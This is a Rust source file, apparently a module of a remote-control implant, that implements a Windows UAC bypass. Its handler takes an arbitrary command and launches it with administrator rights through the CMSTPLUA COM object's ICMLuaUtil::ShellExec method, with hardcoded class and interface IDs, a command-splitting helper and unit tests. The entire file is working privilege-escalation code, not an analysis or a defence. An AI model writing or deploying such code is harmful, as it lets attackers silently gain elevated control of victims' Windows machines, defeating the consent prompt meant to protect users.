use anyhow::Result;
use serde_json::{json, Value};

use super::CommandHandler;

pub struct UacBypassHandler;

impl CommandHandler for UacBypassHandler {
    fn execute(&self, args: Value) -> Result<Value> {
        let command = args["command"]
            .as_str()
            .ok_or_else(|| anyhow::anyhow!("missing 'command' argument"))?
            .to_string();

        execute_uac_bypass(&command)
    }
}

#[cfg(target_os = "windows")]
fn execute_uac_bypass(command: &str) -> Result<Value> {
    shell_exec_elevated(command)?;
    Ok(json!({
        "status": "launched",
        "command": command,
        "method": "CMSTPLUA ICMLuaUtil::ShellExec"
    }))
}

#[cfg(not(target_os = "windows"))]
fn execute_uac_bypass(_command: &str) -> Result<Value> {
    anyhow::bail!("uac_bypass is only supported on Windows")
}

// CMSTPLUA CLSID: {3E5FC7F9-9A51-4367-9063-A120244FBEC7}
#[cfg(target_os = "windows")]
const CMSTPLUA_CLSID: windows::core::GUID = windows::core::GUID::from_values(
    0x3E5FC7F9,
    0x9A51,
    0x4367,
    [0x90, 0x63, 0xA1, 0x20, 0x24, 0x4F, 0xBE, 0xC7],
);

// ICMLuaUtil IID: {6EDD6D74-C007-4E75-B76A-E5740995E24C}
#[cfg(target_os = "windows")]
#[windows::core::interface("6EDD6D74-C007-4E75-B76A-E5740995E24C")]
unsafe trait ICMLuaUtil: windows::core::IUnknown {
    fn ShellExec(
        &self,
        file: windows::core::PCWSTR,
        args: windows::core::PCWSTR,
        directory: windows::core::PCWSTR,
        verb: windows::core::PCWSTR,
        show: u32,
    ) -> windows::core::HRESULT;
}

/// Split `"prog.exe arg1 arg2"` into `("prog.exe", "arg1 arg2")`.
/// Handles quoted executables, e.g. `"\"C:\\foo bar\\x.exe\" /flag"`.
fn split_cmd(cmd: &str) -> (String, String) {
    if cmd.starts_with('"') {
        if let Some(i) = cmd[1..].find('"') {
            return (cmd[1..i + 1].to_string(), cmd[i + 2..].trim().to_string());
        }
    }
    match cmd.find(' ') {
        Some(i) => (cmd[..i].to_string(), cmd[i + 1..].to_string()),
        None => (cmd.to_string(), String::new()),
    }
}

#[cfg(target_os = "windows")]
fn to_wide_null(s: &str) -> Vec<u16> {
    s.encode_utf16().chain(std::iter::once(0u16)).collect()
}

#[cfg(target_os = "windows")]
fn shell_exec_elevated(command: &str) -> Result<()> {
    use windows::Win32::System::Com::{CoInitializeEx, CoUninitialize, COINIT_APARTMENTTHREADED};

    let (file, args_str) = split_cmd(command);
    let file_wide = to_wide_null(&file);
    let args_wide = to_wide_null(&args_str);

    unsafe {
        let init_hr = CoInitializeEx(None, COINIT_APARTMENTTHREADED);
        let result = shell_exec_inner(&file_wide, &args_wide);
        // S_OK (0) or S_FALSE (1) = init succeeded, must uninit.
        // RPC_E_CHANGED_MODE = COM already init'd differently, must NOT uninit.
        if init_hr.is_ok() {
            CoUninitialize();
        }
        result
    }
}

#[cfg(target_os = "windows")]
unsafe fn shell_exec_inner(prog_w: &[u16], args_w: &[u16]) -> Result<()> {
    use windows::Win32::System::Com::{CoCreateInstance, CLSCTX_LOCAL_SERVER};

    let empty_w = to_wide_null("");
    let verb_w = to_wide_null("runas");

    let obj: ICMLuaUtil = CoCreateInstance(&CMSTPLUA_CLSID, None, CLSCTX_LOCAL_SERVER)
        .map_err(|e| anyhow::anyhow!("CoCreateInstance failed: {e}"))?;

    obj.ShellExec(
        windows::core::PCWSTR(prog_w.as_ptr()),
        windows::core::PCWSTR(args_w.as_ptr()),
        windows::core::PCWSTR(empty_w.as_ptr()),
        windows::core::PCWSTR(verb_w.as_ptr()),
        1u32,
    )
    .ok()
    .map_err(|e| anyhow::anyhow!("ICMLuaUtil::ShellExec failed: {e}"))?;

    Ok(())
}

#[cfg(test)]
mod tests {
    use super::split_cmd;

    #[test]
    fn split_unquoted() {
        let (prog, args) = split_cmd("cmd.exe /c whoami");
        assert_eq!(prog, "cmd.exe");
        assert_eq!(args, "/c whoami");
    }

    #[test]
    fn split_quoted_prog() {
        let (prog, args) = split_cmd("\"C:\\foo bar\\x.exe\" /flag");
        assert_eq!(prog, "C:\\foo bar\\x.exe");
        assert_eq!(args, "/flag");
    }

    #[test]
    fn split_no_args() {
        let (prog, args) = split_cmd("notepad.exe");
        assert_eq!(prog, "notepad.exe");
        assert_eq!(args, "");
    }

    #[test]
    fn compiles_on_host() {}
}
